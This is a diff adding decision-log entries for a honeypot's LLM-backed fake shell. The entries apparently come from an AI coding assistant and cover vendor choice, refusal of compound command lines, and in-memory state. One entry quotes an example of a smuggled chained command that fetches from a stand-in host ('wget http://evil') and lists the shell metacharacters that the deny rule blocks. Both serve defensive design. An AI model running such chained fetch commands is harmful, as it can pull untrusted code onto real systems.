@@ -345,3 +345,86 @@ of the browser-can't-set-headers constraint discovered while wiring
 question with a real design fork posed to you; logged anyway since it's a
 security-relevant trade-off a reviewer should be able to see was made
 deliberately, not accidentally.
+
+## 2026-08-26 — LLM shell completion: multi-vendor from the start, over an
+Anthropic-only v1
+
+**Chose:** Ship the P2 completion fallback with a two-implementation provider
+abstraction — `AnthropicProvider` (forced tool-use) and
+`OpenAICompatibleProvider` (OpenAI SDK against a configurable `base_url`) —
+selectable per deployment and switchable at runtime from the dashboard.
+
+**Why:** You asked for full multi-vendor rather than the narrower option I
+proposed, so operators aren't locked to one API for a feature that costs them
+money on their own infrastructure. The lift is contained because one
+`OpenAICompatibleProvider` covers OpenAI *and* every self-hosted runtime worth
+naming — Ollama, vLLM and LM Studio all speak the OpenAI chat-completions API,
+so "self-hosted" is a `base_url`, not a third client. That kept multi-vendor
+to two implementations rather than one per runtime, and the engine that
+surrounds them (cache, budgets, breaker) is vendor-agnostic and tested
+entirely through fakes.
+
+**Alternative considered:** Anthropic-only with selectable model tiers — my
+recommendation, on the grounds that `ml/mirage/intel/summarize.py` is the only
+proven LLM integration here and it runs in a latency-insensitive background
+path, while this one sits on an attacker's interactive prompt where every new
+failure mode is felt immediately. Rejected in favour of operator choice.
+
+**My answer before seeing yours:** n/a inverted — I gave my recommendation
+first (Anthropic-only, model tiers) and you chose the broader option. Logged
+because the divergence is the interesting part: the risk I was pricing was
+"more vendor surface on a real-time path", and the mitigation that made your
+choice cheap was realising the OpenAI protocol is a de-facto standard for
+self-hosting, which collapses three runtimes into one client.
+
+## 2026-08-26 — The completion fallback refuses compound lines outright
+
+**Chose:** `ShouldAttemptCompletion` returns false for any line containing
+`;`, `&&`, `||`, `|`, `<`, `>`, `$(`, backticks or `&` — the whole line goes
+to the real interpreter instead.
+
+**Why:** A completion replaces the output of the *entire line*, but eligibility
+is decided from the *first word*. Without this rule `uptime; wget http://evil`
+would be judged on `uptime`, and the `wget` stage would be answered by a model
+rather than by the interpreter that knows to refuse it — quietly defeating the
+egress ceiling in SECURITY.md through a gap in parsing, not in policy. Refusing
+compound lines makes the "first word decides" shortcut sound, instead of making
+the gate parse shell grammar it would then have to keep in sync with
+`evalLine`.
+
+**Alternative considered:** Per-stage completion — tokenize the line, complete
+only the eligible stages, let the interpreter run the rest. Strictly more
+capable, and the right end state if compound lines turn out to matter, but it
+means reimplementing (and re-verifying) the interpreter's own parsing in the
+gate, for commands the preprint shows are overwhelmingly issued one at a time.
+
+**My answer before seeing yours:** n/a — this surfaced while writing the gate's
+tests, not as a question posed to you. Logged because "why does a chained
+command never get completed?" is exactly the kind of thing a reviewer would
+ask, and the answer is a deliberate safety property rather than an oversight.
+
+## 2026-08-26 — Completion state stays in memory, not Postgres
+
+**Chose:** The per-session response cache, budget counters, circuit-breaker
+state and the active-provider pointer all live in `CompletionEngine`'s
+in-memory dicts, guarded by one lock and TTL-evicted — mirroring
+`LiveDeceptionEngine`. Nothing is persisted; a restart resets the active
+provider to `MIRAGE_LLM_SHELL_ACTIVE_PROVIDER`.
+
+**Why:** `mirage-deception` today has *zero* Postgres dependency (its compose
+block says so explicitly), and it has no `depends_on` precisely so it can
+start, fail, or be absent without affecting the honeypot. Adding a database
+connection so one mutable string survives a restart would trade that
+independence for very little: the cache is session-scoped and worthless after
+a restart anyway (sessions are gone), and budgets resetting on restart is
+acceptable for a process that restarts rarely.
+
+**Alternative considered:** A small Postgres-backed runtime-config table, which
+would make the dashboard's provider choice durable and would generalise to a
+future multi-instance deployment. Worth revisiting if this service is ever run
+with more than one replica — at that point in-memory budgets stop being global
+and the breaker stops being shared, which is the real trigger for persisting.
+
+**My answer before seeing yours:** n/a — implementation-level call made while
+building; noted since "why isn't the provider choice saved?" has a real answer
+worth being able to give.
